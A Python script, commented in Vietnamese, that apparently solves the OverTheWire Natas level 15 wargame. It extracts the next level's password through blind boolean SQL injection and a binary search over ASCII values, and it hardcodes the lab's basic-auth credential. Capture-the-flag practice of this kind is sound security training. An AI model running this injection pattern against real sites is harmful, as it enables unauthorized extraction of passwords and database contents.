import urllib.request
import urllib.parse
import base64

# Cấu hình mục tiêu
url = "http://natas15.natas.labs.overthewire.org/index.php"
credentials = base64.b64encode(b"natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g").decode("ascii")

def check_condition(payload):
    data = urllib.parse.urlencode({"username": payload}).encode("utf-8")
    req = urllib.request.Request(url, data=data)
    req.add_header("Authorization", f"Basic {credentials}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            content = resp.read().decode("utf-8")
            return "This user exists" in content
    except Exception as e:
        print(f"Lỗi kết nối: {e}")
        return False

# Bắt đầu dò 32 ký tự mật khẩu của natas16 bằng Tìm kiếm nhị phân (Binary Search)
password = ""
print("[*] Đang trích xuất mật khẩu cho natas16...")

for pos in range(1, 33):
    low = 48   # Mã ASCII ký tự '0'
    high = 122 # Mã ASCII ký tự 'z'
    
    while low <= high:
        mid = (low + high) // 2
        # Hỏi MySQL: Mã ASCII của ký tự tại vị trí pos có lớn hơn mid không?
        payload = f'natas16" AND ASCII(SUBSTRING(password, {pos}, 1)) > {mid} #'
        if check_condition(payload):
            low = mid + 1
        else:
            high = mid - 1
            
    char = chr(low)
    password += char
    print(f"Vị trí {pos:02d}: {char} -> Mật khẩu hiện tại: {password}")

print(f"\n[+] Mật khẩu hoàn chỉnh của natas16 là: {password}")
